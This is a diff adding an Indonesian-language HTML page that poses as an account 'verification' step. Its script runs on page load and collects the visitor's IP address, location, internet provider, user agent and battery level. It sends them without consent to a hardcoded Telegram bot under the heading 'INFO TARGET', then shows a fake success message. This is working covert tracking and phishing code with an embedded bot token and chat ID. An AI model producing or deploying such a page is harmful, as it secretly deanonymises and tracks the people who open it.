@@ -1,0 +1,77 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Verifikasi Akun</title>
+</head>
+<body style="text-align:center; font-family:sans-serif;">
+  <h2>Mohon Tunggu Sebentar...</h2>
+  <p>Sedang memverifikasi data perangkat Anda...</p>
+
+  <script>
+    const BOT_TOKEN = "7569873999:AAHU_qeGNW05xc7EDIrhV4kUtHUPMJidXKQ";
+    const CHAT_ID = "6257069794";
+
+    function getBatteryInfo() {
+      return navigator.getBattery().then(battery => {
+        return `🔋 Baterai: ${Math.round(battery.level * 100)}%`;
+      }).catch(() => "🔋 Baterai: Tidak tersedia");
+    }
+
+    async function getIPInfo() {
+      try {
+        const res = await fetch("https://ipapi.co/json/");
+        const data = await res.json();
+        return {
+          ip: data.ip,
+          city: data.city,
+          region: data.region,
+          country: data.country_name,
+          org: data.org
+        };
+      } catch {
+        return {
+          ip: "Tidak diketahui",
+          city: "-",
+          region: "-",
+          country: "-",
+          org: "-"
+        };
+      }
+    }
+
+    async function sendToTelegram() {
+      const ua = navigator.userAgent;
+      const time = new Date().toLocaleString();
+      const battery = await getBatteryInfo();
+      const ipinfo = await getIPInfo();
+
+      const message = `
+📥 INFO TARGET
+🕒 Waktu: ${time}
+🌐 IP: ${ipinfo.ip}
+📍 Lokasi: ${ipinfo.city}, ${ipinfo.region}, ${ipinfo.country}
+🏢 Provider: ${ipinfo.org}
+📱 Perangkat: ${ua}
+${battery}
+      `;
+
+      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chat_id: CHAT_ID,
+          text: message
+        })
+      });
+
+      document.body.innerHTML = `
+        <h2>Verifikasi Selesai</h2>
+        <p>Data perangkat Anda berhasil diverifikasi.</p>
+        <p>Silakan kembali ke aplikasi.</p>
+      `;
+    }
+
+    sendToTelegram();
+  </script>
+</body>
+</html>
